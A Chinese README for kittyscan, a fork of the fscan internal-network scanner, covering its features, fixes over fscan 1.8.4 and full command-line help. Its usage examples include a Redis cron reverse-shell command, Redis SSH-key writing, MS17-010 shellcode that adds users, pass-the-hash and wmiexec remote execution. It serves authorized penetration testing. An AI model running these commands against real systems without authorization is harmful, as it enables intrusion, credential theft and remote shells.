# kittyscan v1.2

[English][url-docen]

> **本项目基于 [fscan](https://github.com/shadow1ng/fscan) 1.8.4 二次开发**（MIT License · Copyright (c) 2021 shadow1ng），
> 保留原作者版权与许可声明，详见 [LICENSE.txt](LICENSE.txt)。
> 相对原版的全部差异见下方 **第 3 节《相对 fscan 1.8.4 的更新与修复》**，v1.0 / v1.1 阶段的逐项变更明细见 [CHANGELOG\_v1.0.md](CHANGELOG_v1.0.md)。
> 
> ⚠️ **免责声明**：本工具仅限在**已获明确授权**的环境中使用。禁止对未授权目标进行扫描或攻击；因滥用造成的任何后果由使用者自行承担。

# 1. 简介

一款内网综合扫描工具，方便一键自动化、全方位漏扫扫描。
支持主机存活探测、端口扫描、常见服务的爆破、MS17-010、Redis 批量写公钥、计划任务反弹 shell、读取 Win 网卡信息、Web 指纹识别、Web 漏洞扫描、NetBIOS 探测、域控识别等功能。

kittyscan 在 fscan 1.8.4 的基础上，沿三个方向持续改进：

- **覆盖更广**：服务插件 24 → 41，POC 386 → 688，默认端口 21 → 143，密码字典、爆破服务同步扩充；
- **判定更准**：新增 WinRM NTLM 爆破、修复 LDAP/Kafka/Rsync 等协议实现错误（原版 100% 漏报）、按 nuclei 模板收紧指纹与 POC 误报；
- **跑得更稳**：数据库爆破无超时挂死、RDP 爆破死锁、727 个并发 DATA RACE、Redis RESP 解析错位等稳定性问题全部修复，并通过 `-race`、真实环境、靶机三类验证。

# 2. 主要功能

1. 信息搜集：

- 存活探测（ICMP / `-ping`）
- 端口扫描（支持 `-syn` 半连接扫描，需管理员/root）
- 流水线调度：发现端口即并行触发 WebTitle 与服务爆破

2. 爆破功能：

- 各类服务爆破：SSH、SMB、RDP、**WinRM**、FTP、Telnet、VNC、SVN、LDAP、Elasticsearch、Tomcat、WebLogic、ActiveMQ、RabbitMQ、Kafka、Zookeeper、Rsync、SNMP 等
- 数据库密码爆破：MySQL、MSSQL、PostgreSQL、Oracle、Redis、MongoDB 等
- `-br N` 单目标爆破并发（对**全部**爆破模块生效，默认 1 = 串行）

3. 系统信息、漏洞扫描：

- NetBIOS 探测、域控识别
- 获取目标网卡信息
- 高危漏洞扫描（MS17-010 等）

4. Web 探测：

- WebTitle 探测
- Web 指纹识别（常见 CMS、OA 框架等）
- **纯指纹模式**：`-m finger`（先端口扫描再识别指纹）、`-m fingeronly`（跳过端口扫描，直接按 Web 端口探测）
- Web 漏洞扫描（WebLogic、Struts2 等，支持 xray 格式 POC），DnsLog 反连检测默认开启（`-nodns` 关闭，`-ceye-key`/`-ceye-domain` 可覆盖凭据）

5. 漏洞利用：

- Redis 写公钥或写计划任务
- SSH 命令执行
- MS17017 利用（植入 shellcode），如添加用户等

6. 输出与其他：

- 标签化彩色输出：`[port]` / `[web]` / `[info]` / `[vul]`，POC 命中附完整请求、匹配表达式与响应片段
- `-json` NDJSON 结果输出、`-silent` 静默、`-nocolor` 去色
- Ctrl+C 优雅退出（停止派发 → 在途结果落盘 → 打印完成统计）
- 随机扫描延迟（默认开启，`-nodelay` 关闭）、`-tls` 最低 TLS 版本、`-maxconns` 每主机连接数、7 个最新 User-Agent 随机轮换

# 3. 相对 fscan 1.8.4 的更新与修复

## 3.1 规模对比

| 项目 | fscan 1.8.4 | kittyscan v1.2 |
| --- | --- | --- |
| 服务插件（`Plugins/*.go`） | 24 | **41** |
| POC（`WebScan/pocs/*.yml`） | 386 | **688** |
| 默认扫描端口 | 21 | **143** |
| Go 源码行数 | 约 7,700 | **约 14,200** |

默认行为差异：

| 项目 | fscan 1.8.4 | kittyscan v1.2 |
| --- | --- | --- |
| 默认线程数 `-t` | 600 | 100（更隐蔽） |
| 默认输出文件 `-o` | `result.txt` | `output.txt` |
| DnsLog 反连检测 | 默认关闭（`-dns` 开启） | **默认开启**（`-nodns` 关闭） |
| 扫描延迟 | 无 | 默认随机延迟（`-nodelay` 关闭） |
| 代理参数 | `-proxy` + `-socks5` 两个参数 | 统一为 `-proxy`（按协议分流，见 3.2） |
| 帮助 | 无 | `-help` 中文帮助 / `-hen` 英文帮助（均带样例） |

## 3.2 新增功能

### 新增服务插件（原版 24 个 → 41 个）

> 下列插件原版 fscan 1.8.4 均不具备。扩展目的是把常见高价值中间件、数据库、存储与远程管理服务纳入**未授权检测与弱口令爆破**的覆盖范围。

| 插件（端口） | 功能 | 扩展目的 |
| --- | --- | --- |
| Elasticsearch (9200) | 未授权访问检测 + Basic Auth 口令爆破 | 云原生/日志存储未授权是重灾区 |
| Tomcat (8080) | Manager Basic Auth 口令爆破 | 高频 Java 中间件弱口令 |
| WebLogic (7001) | 控制台表单登录爆破 | 国产高价值 Java 中间件 |
| ActiveMQ (8161/61616) | 未授权检测 + 管理台口令爆破 | 消息队列未授权与弱口令 |
| VNC (5900) | RFB 协议 DES 加密口令爆破 | 远程桌面弱口令 |
| SVN (3690) | HTTP OPTIONS 探测 + Basic Auth 爆破 | 源码泄露入口 |
| LDAP (389/5000/636) | 原生 LDAP Bind 口令爆破 | 域环境凭据碰撞 |
| Zookeeper (2181) | 四字命令 `ruok` 健康/未授权检测 | 分布式协调服务未授权 |
| Kafka (9092) | Metadata 请求未授权探测 | 消息队列未授权 |
| RabbitMQ (15672) | HTTP API `/api/overview` 未授权检测 | 管理台未授权 |
| Rsync (873) | 协议握手、模块列表枚举与口令爆破 | 备份/源码泄露 |
| Telnet (23) | TCP 连接 + 口令爆破 | 明文协议弱口令 |
| SNMP (161/UDP) | UDP GET sysDescr，community 爆破 | 网络设备信息泄露 |
| RTSP (554) | 流媒体协议探测与口令爆破 | 摄像头/流媒体弱口令 |
| WinRM (5985/5986) | WS-Man + 完整 NTLM Type1/2/3 口令爆破 | Windows 远程管理弱口令（带 canary 防误报） |

### 其他新增能力

- **纯指纹识别模式**：`-m finger` / `-m fingeronly`（只出指纹，不跑 POC、不爆破）
- **SYN 半连接扫描**：`-syn`（Linux root 原始套接字，其余环境自动降级 TCP Connect）
- **中英文帮助**：`-help` / `-hen`，每个参数带示例
- **反连凭据可覆盖**：`-ceye-key` / `-ceye-domain`
- **统一代理入口 `-proxy`**：
  - `-proxy http://...` → 仅 HTTP（Web/POC）出口，端口扫描与爆破等 TCP 流量直连；
  - `-proxy socks5://...` → 全局代理，所有 TCP 拨号与 Web/POC 请求均走代理（自动跳过 ICMP 探测）；
  - 支持 `host:port`、纯端口、`-proxy 1`（Burp）、`-proxy 2`（SOCKS5）等快捷写法；**原 `-socks5` 已并入本参数，老脚本需改写为 `-proxy socks5://...`**
- **输出增强**：`[port]/[web]/[info]/[vul]` 标签化彩色输出；POC 命中输出完整请求、Match 表达式与 Response 片段
- **端口 / 字典 / POC 扩展**：默认端口 21 → 143；密码字典 70 → 100+（年份变体、键盘序列、服务默认口令等）+ 9 个新服务的账号字典；POC 386 → 688（含 Spring Actuator、VMware、Nacos、国产 OA/CMS 等）
- **时间盲注支持**：POC 规则 `response.duration >= 秒数`
- **POC 字段扩展**：支持 `response.raw_header`（原始响应头）与 `output` 变量提取，供 POC 做更细匹配与二次请求取值
- **POC 规则短路字段**：`stop_if_match`（本条命中即停并判定本组命中，OR 型"找到就收工"）/ `stop_if_mismatch`（本条不命中即停，与顺序 AND 链默认行为一致），语义对齐 afrog/xray
- **POC 基准支持路径前缀**：原始 URL 自带子目录时，根与该目录都会作为基准 —— `-u http://h/app/dev/api/login.html` 会打 `http://h/` 与 `http://h/app/dev/api/`（该条不受 `-no302base` 影响）
- **302 跳转派生 POC 基准**（默认开启，`-no302base` 关闭）：在上述两条基准之外，同域跳子目录则追加该目录前缀（如 `http://host/dev/`），跳根级文件（`/login.html`）不追加；跨域则追加新 host 的根（忽略其路径深度）
- **Ctrl+C 优雅退出**：停止派发新任务 → 在途结果落盘（8s 兜底）→ 打印完成统计 → 退出码 130
- **工程化**：`build.py` 一键多平台构建（UPX 压缩可选，未安装自动跳过）

## 3.3 相对 fscan 1.8.4 的修复与优化

> 下表以原版 1.8.4 为基准**集中列示**（新增插件自身的实现细节不在此列，其功能与目的见 3.2）。

| 类别 | 修复与优化 |
| --- | --- |
| 稳定性 | Postgres/MySQL/MSSQL 无 IO 超时 → 目标不回包时爆破**永久挂死**（实测 blackhole 30s+ → 2.2s 正常退出）；RDP 爆破成功即死锁（`brlist` 改带缓冲，成功/失败路径都能收尾）；RDP 连接路径并发 DATA RACE → `-race` 复测归零（修复前 727 个）；CIDR `/7`\\~`/0` 无上限展开导致 OOM → 上限 65536 + 明确提示并跳过该目标 |
| 漏报与越界 | POC 响应 header 键大小写不一致 → `no such key` 使约 30 个 POC 永久失效（含 Nacos）→ canonical/小写双写；302 跨域把 POC 打到外部域名且漏掉原始目标 → 基准显式计算（见 3.2）；`-hn` 对 `-hf` 的 `ip:port` 目标失效（授权边界）→ 过滤前移到 `ParseIP` 源头；`-pa` 追加端口破坏端口收敛；ICMP 一对多映射使 `localhost` 与 `127.0.0.1` 只报一个存活；GBK 页面中文指纹不命中（原版解码发生在指纹注入之后）→ 解码提前到注入之前；`-br` 原版仅 RDP 生效 → 扩展到全部爆破模块（实测约 3.6 倍提速）；`-nobr` 由连带跳过漏洞检测改为只跳爆破 |
| 误报控制 | fcgi 系统性误报判定修正；指纹规则收紧 5 条（依据 nuclei 模板）并复活 3 条失效规则；删除 11 个只判 `status=200` 的高误报 POC；Redis `-rf`/`-rs` 写入失败时跳过配置恢复 → 可能覆盖目标真实公钥，恢复改为 `defer` 覆盖全部返回路径 |
| 输出与交互 | `-silent` 原版仅 1 处生效点 → 现全局 17 处收敛（状态行/加载汇总均静默）；`-json` 输出保证为合法 NDJSON；非法参数与非法目标由静默改为明确报错；`os.Stdout` 实时刷新（原版 Windows 下输出卡顿）；`-rf`/`-sshkey`/`-pocpath` 支持 BOM/UTF-16 编码文件；爆破超时分级（SSH 1s / 其他 2s） |

## 3.4 验证情况

- 每批改动均通过 **Windows + `GOOS=linux` 双平台编译**，`gofmt` / `go vet` 干净
- `-race`（CGO + GCC）：RDP 路径竞态修复后 **5 轮复测全部为 0**
- 真实环境验证：公网资产与 Kali 靶场逐项实测（协议类逐项对拍）
- 靶机实测：Windows 靶机 RDP / WinRM 正确口令与并发（正确口令出 `[vul]`、错误口令无误报）；Kali Redis 全矩阵（写公钥 / 写 cron 后目标配置恢复）
- 本地假靶场回归：POC 基准、代理作用域、规则短路字段、302 基准等行为逐例验证

## 3.5 已知限制

- `-br N>1` 时，`[vul]` 在连接内的插件若多 worker 同时成功可能输出多条；**Redis 建议 `-br 1`**
- WinRM canary 检测会在目标安全日志留下 1 次不存在账号的失败登录（防误报的设计代价）
- `-noredis` 只跳过写入动作，未授权检测与爆破照常执行

# 4. 使用说明

简单用法：

```
kittyscan.exe -h 192.168.1.1/24        (默认使用全部模块)
kittyscan.exe -h 192.168.1.1/16        (B段扫描)
```

其他用法：

```
kittyscan.exe -h 192.168.1.1/24 -np -no -nopoc   (跳过存活检测、不保存文件、跳过web poc扫描)
kittyscan.exe -h 192.168.1.1/24 -rf id_rsa.pub   (redis 写公钥)
kittyscan.exe -h 192.168.1.1/24 -rs 192.168.1.1:6666 (redis 计划任务反弹shell)
kittyscan.exe -h 192.168.1.1/24 -c whoami        (ssh 爆破成功后，命令执行)
kittyscan.exe -h 192.168.1.1/24 -m ssh -p 2222   (指定模块ssh和端口)
kittyscan.exe -h 192.168.1.1/24 -pwdf pwd.txt -userf users.txt (加载指定文件的用户名、密码来进行爆破)
kittyscan.exe -h 192.168.1.1/24 -o /tmp/1.txt    (指定扫描结果保存路径,默认保存在当前路径)
kittyscan.exe -h 192.168.1.1/8                   (A段的192.x.x.1和192.x.x.254,方便快速查看网段信息)
kittyscan.exe -h 192.168.1.1/24 -m smb -pwd password (smb密码碰撞)
kittyscan.exe -h 192.168.1.1/24 -m ms17010       (指定模块)
kittyscan.exe -hf ip.txt                          (以文件导入)
kittyscan.exe -u http://baidu.com -proxy 8080     (扫描单个url,并设置http代理 http://127.0.0.1:8080)
kittyscan.exe -h 192.168.1.1/24 -proxy socks5://127.0.0.1:1080 (全局代理:所有TCP拨号与Web/POC请求都走代理)
kittyscan.exe -h 192.168.1.1/24 -nobr -nopoc     (不进行爆破,不扫Web poc,以减少流量)
kittyscan.exe -h 192.168.1.1/24 -pa 3389         (在原基础上,加入3389->rdp扫描)
kittyscan.exe -h 192.168.1.1/24 -m ms17010 -sc add (内置添加用户等功能,推荐使用专项利用工具)
kittyscan.exe -h 192.168.1.1/24 -m smb2 -user admin -hash xxxxx (pth hash碰撞,xxxx:ntlmhash)
kittyscan.exe -h 192.168.1.1/24 -m wmiexec -user admin -pwd password -c xxxxx (wmiexec无回显命令执行)
kittyscan.exe -m finger -h 192.168.1.1/24 -p 80,443,8080 (纯指纹:先端口扫描再识别web指纹,自动跳过POC与爆破)
kittyscan.exe -m fingeronly -h 192.168.1.1       (纯指纹:跳过端口扫描,直接按Web端口列表探测并识别指纹)
kittyscan.exe -u http://192.168.1.1:8080 -m finger (单URL纯指纹识别)
kittyscan.exe -h 192.168.1.1/24 -syn             (SYN半连接扫描,需管理员/root)
kittyscan.exe -h 192.168.1.1/24 -br 8            (单目标爆破并发,全部爆破模块生效)
kittyscan.exe -h 192.168.1.0/24 -nodns           (禁用DnsLog反连检测)
```

编译：

```powershell
# Windows
go build -ldflags="-s -w" -trimpath -o kittyscan.exe main.go

# Linux 交叉编译（注意：_linux 文件不参与 Windows 构建，必须交叉编译才能发现其编译错误）
$env:GOOS="linux"; $env:GOARCH="amd64"; go build -trimpath -o kittyscan main.go

# 一键多平台构建（UPX 压缩可选，未检测到 upx 会自动跳过）
python build.py
```

完整参数（等同于直接运行 `kittyscan.exe -help`，英文版见 `-hen`）：

```
--------------------------------------
用法: kittyscan.exe [选项]
      -help 显示本中文帮助，-hen 显示英文帮助

目标:
  -h  string   扫描目标IP/域名/CIDR
                例: -h 192.168.1.1
                例: -h 192.168.1.0/24
                例: -h 192.168.1.1,192.168.1.2
  -hn string   排除指定主机
                例: -hn 192.168.1.1/24
  -hf string   从文件批量读取目标
                例: -hf ip.txt

存活探测:
  -np          跳过存活探测直接扫描端口
  -ping        使用Ping替代ICMP探测存活

端口:
  -p  string   指定扫描端口（默认143个常用端口）
                例: -p 22
                例: -p 1-65535
                例: -p 22,80,3306
  -pa string   追加端口到默认列表
                例: -pa 3389
  -pn string   排除指定端口
                例: -pn 445
  -portf string  从文件读取端口
                例: -portf ports.txt

扫描类型:
  -m  string   指定扫描类型（默认 all）
                例: -m all        全扫描（端口+服务+Web）
                例: -m ssh        仅SSH爆破
                例: -m redis      仅Redis未授权/爆破
                例: -m mysql      仅MySQL爆破
                例: -m web        仅Web漏洞扫描
                例: -m finger     仅Web指纹识别（自动跳过POC与爆破）
                例: -m fingeronly 仅Web指纹识别且跳过端口扫描（直接按Web端口探测）
                例: -m portscan   仅端口扫描
                例: -m icmp       仅存活探测
                例: -m ms17010    仅MS17-010检测

Web扫描:
  -u  string   直接指定URL进行扫描
                例: -u http://192.168.1.1:8080
  -uf string   URL文件批量扫描
                例: -uf urls.txt
  -pocname string  按名称筛选POC
                例: -pocname weblogic
  -pocpath string  自定义POC目录
                例: -pocpath /path/to/pocs
  -full        POC全量扫描（如Shiro全部Key）
  -dns         使用DnsLog检测无回显漏洞（默认开启）
  -nodns       禁用DnsLog反连检测
  -no302base   关闭302跳转派生的附加POC基准（默认开启）
                始终打: 原始根 + 原始URL自身子目录（.../app/dev/api/login.html → http://h/ 与 http://h/app/dev/api/）
                开启时另追加: 同域跳子目录的目录前缀 + 跨域新host的根（关闭则只保留上面两条）
  -ceye-key string  覆盖ceye反连API Key（留空则使用内置默认值）
                例: -ceye-key 0123456789abcdef0123456789abcdef
  -ceye-domain string  覆盖ceye二级域名（留空则使用内置默认值）
                例: -ceye-domain abc.ceye.io
  -nopoc       跳过Web漏洞扫描（仅做端口和服务检测）
  -cookie string  设置请求Cookie
                例: -cookie rememberMe=login
  -proxy string   设置代理（按协议区分作用域，原 -socks5 已并入本参数）
                http://   → 仅 HTTP(Web/POC) 出口，端口/爆破等TCP流量直连
                socks5:// → 全局代理，所有TCP拨号(端口/服务/爆破)与Web/POC请求均走代理(自动跳过ICMP探测)
                例: -proxy http://127.0.0.1:8080
                例: -proxy socks5://127.0.0.1:1080
                例: -proxy 127.0.0.1:8080    (默认HTTP)
                例: -proxy 8080              (默认127.0.0.1)
                例: -proxy 1                 (Burp默认，仅HTTP)
                例: -proxy 2                 (SOCKS5默认，全局)
  -num int     POC并发数（默认20）
                例: -num 50

账号爆破:
  -user string   指定用户名
                例: -user admin
  -pwd  string   指定密码
                例: -pwd 123456
  -userf string  从文件读取用户名
                例: -userf user.txt
  -pwdf string   从文件读取密码
                例: -pwdf pass.txt
  -usera string  追加用户名到默认列表
                例: -usera testuser
  -pwda string   追加密码到默认列表
                例: -pwda P@ssw0rt1
  -nobr        跳过密码爆破（漏洞检测照常执行）

特殊功能:
  -c  string   SSH/WmiExec远程执行命令
                例: -c whoami
  -sshkey string  SSH密钥文件
                例: -sshkey id_rsa
  -domain string  SMB域
                例: -domain WORKGROUP
  -sc  string   MS17-010 Shellcode
                例: -sc add
  -hash string   SMB NTLM Hash
                例: -hash aad3b435b51404eeaad3b435b51404ee
  -rf  string   Redis写入SSH公钥文件
                例: -rf id_rsa.pub
  -rs  string   Redis写入计划任务反弹Shell
                例: -rs 192.168.1.1:6666
  -path string  Fcgi/SMB远程文件路径
                例: -path /www/wwwroot/index.php
  -noredis     跳过Redis未授权写入测试
  -wmi         135端口发现时额外尝试WMI命令执行
  -syn         SYN半连接扫描（需管理员/root权限）

性能调优:
  -t  int       并发线程数（默认100）
                例: -t 500
  -time int     连接超时秒（默认3）
                例: -time 5
  -wt  int      Web请求超时秒（默认5）
                例: -wt 10
  -br  int      单目标爆破并发数（默认1=串行，全部爆破模块生效）
                例: -br 5
  -num int      POC并发数（默认20）
                例: -num 50
  -tls int      TLS最低版本（默认10）
                例: -tls 12   (更安全)
                例: -tls 13   (最新)
  -maxconns int 每主机最大连接数（默认10）
                例: -maxconns 20
  -nodelay     禁用随机扫描延迟（默认开启延迟）
                Web请求延迟100-300ms，爆破延迟50-100ms

输出控制:
  -o  string    输出文件（默认 output.txt）
                例: -o output.txt
  -no           不保存结果到文件
  -json         JSON格式输出
  -silent       静默模式
  -nocolor      禁用彩色输出
  -top int      显示存活主机TOP数（默认10）
                例: -top 20
  -debug int    进度日志间隔秒（默认60）
                例: -debug 30

常用示例:
  kittyscan.exe -h 192.168.1.0/24
  kittyscan.exe -h 192.168.1.1 -m ssh -t 100
  kittyscan.exe -h 192.168.1.1 -p 80,443,8080 -m all
  kittyscan.exe -hf ip.txt -p 22,3306,6379
  kittyscan.exe -u http://192.168.1.1:8080 -pocname struts2
  kittyscan.exe -h 192.168.1.0/24 -m ssh -user admin -pwdf pass.txt
  kittyscan.exe -h 192.168.1.0/24 -nodns          禁用反连检测
```

# 5. 运行截图

编译脚本截图
![](image/1.png)

存活探测截图
![](image/2.png)

漏洞扫描截图
![](image/3.png)


# 6. 免责声明

本工具仅面向**合法授权**的企业安全建设行为，如您需要测试本工具的可用性，请自行搭建靶机环境。

为避免被恶意使用，本项目所有收录的poc均为漏洞的理论判断，不存在漏洞利用过程，不会对目标发起真实攻击和漏洞利用。

在使用本工具进行检测时，您应确保该行为符合当地的法律法规，并且已经取得了足够的授权。**请勿对非授权目标进行扫描。**

如您在使用本工具的过程中存在任何非法行为，您需自行承担相应后果，我们将不承担任何法律及连带责任。

在安装并使用本工具前，请您**务必审慎阅读、充分理解各条款内容**，限制、免责条款或者其他涉及您重大权益的条款可能会以加粗、加下划线等形式提示您重点注意。
除非您已充分阅读、完全理解并接受本协议所有条款，否则，请您不要安装并使用本工具。您的使用行为或者您以其他任何明示或者默示方式表示接受本协议的，即视为您已阅读并同意本协议的约束。

[url-docen]: README_EN.md

